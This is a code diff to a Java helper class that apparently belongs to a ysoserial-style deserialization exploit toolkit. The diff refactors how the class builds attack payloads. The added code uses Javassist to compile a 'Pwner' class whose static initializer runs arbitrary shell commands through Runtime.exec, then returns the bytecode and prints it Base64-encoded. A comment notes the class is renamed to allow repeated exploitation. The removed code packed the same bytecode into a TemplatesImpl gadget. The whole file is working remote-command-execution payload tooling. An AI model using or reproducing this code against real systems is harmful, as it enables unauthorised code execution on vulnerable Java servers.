@@ -31,13 +31,12 @@ import javassist.ClassPool;
 import javassist.CtClass;
 import javassist.NotFoundException;
 import org.apache.commons.text.StringEscapeUtils;
-import ser05j.ClassFiles;
-import ser05j.Reflections;
 
 import java.io.IOException;
 import java.io.Serializable;
 import java.lang.reflect.InvocationTargetException;
 import java.util.Arrays;
+import java.util.Base64;
 import java.util.stream.Collectors;
 
 /*
@@ -77,70 +76,39 @@ public class TemplatesUtil {
     private static final long serialVersionUID = 8207363842866235160L;
   }
 
-
-  public static Object createTemplatesImpl(final String[] args)
-      throws ClassNotFoundException, IllegalAccessException, InstantiationException, IOException,
-             CannotCompileException, NotFoundException, NoSuchFieldException, NoSuchMethodException,
-             InvocationTargetException {
-    return createTemplatesImpl(
-        args,
-        Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl"),
-        Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet"),
-        Class.forName("org.apache.xalan.xsltc.trax.TransformerFactoryImpl"));
-  }
-
-
-  private static <T> T createTemplatesImpl(final String[] args, Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory)
-      throws NotFoundException, IllegalAccessException, InstantiationException,
-      CannotCompileException, NoSuchFieldException, IOException, NoSuchMethodException, InvocationTargetException {
-    final T templates = tplClass.getConstructor().newInstance();
-
-    // use template gadget class
-    ClassPool pool = ClassPool.getDefault();
-    pool.insertClassPath(new ClassClassPath(StubTransletPayload.class));
-    pool.insertClassPath(new ClassClassPath(abstTranslet));
-    final CtClass clazz = pool.get(StubTransletPayload.class.getName());
-
-    StringBuilder sb = new StringBuilder();
-    boolean first = true;
-    for (String arg : args) {
-
-      if (!first) {
-        sb.append(',');
-      } else {
-        first = false;
-      }
-
-      sb.append('"');
-      sb.append(arg.replaceAll("\"", "\\\""));
-      sb.append('"');
-    }
-
+  private static String createExecJavaCode(String[] args) {
     String cmdArgs = Arrays.stream(args)
         .map(StringEscapeUtils::escapeJava)
         .map(s -> "\"" + s + "\"")
         .collect(Collectors.joining(", "));
 
-    String javaCode = "java.lang.Runtime.getRuntime().exec(new String[] { " + cmdArgs + " });";
+    return "java.lang.Runtime.getRuntime().exec(new String[] { " + cmdArgs + " });";
+  }
+
+  public static byte[] createExecBytecodes(final String[] args, Class<?> superClass)
+      throws NotFoundException,
+      CannotCompileException, IOException {
+
+    // use template gadget class
+    ClassPool pool = ClassPool.getDefault();
+    pool.insertClassPath(new ClassClassPath(StubTransletPayload.class));
+    pool.insertClassPath(new ClassClassPath(superClass));
+    final CtClass clazz = pool.get(StubTransletPayload.class.getName());
+
+    String javaCode = createExecJavaCode(args);
 
     System.out.println("Java code: " + javaCode);
 
     clazz.makeClassInitializer().insertAfter(javaCode);
     // sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)
     clazz.setName("ysoserial.Pwner" + System.nanoTime());
-    CtClass superC = pool.get(abstTranslet.getName());
+    CtClass superC = pool.get(superClass.getName());
     clazz.setSuperclass(superC);
 
     final byte[] classBytes = clazz.toBytecode();
 
-    // inject class bytes into instance
-    Reflections.setFieldValue(templates, "_bytecodes", new byte[][]{
-        classBytes, ClassFiles.classAsBytes(Foo.class)
-    });
-
-    // required to make TemplatesImpl happy
-    Reflections.setFieldValue(templates, "_name", "Pwnr");
-    Reflections.setFieldValue(templates, "_tfactory", transFactory.getConstructor().newInstance());
-    return templates;
+    String encodedByteCodes = Base64.getEncoder().encodeToString(classBytes);
+    System.out.println(encodedByteCodes);
+    return classBytes;
   }
 }
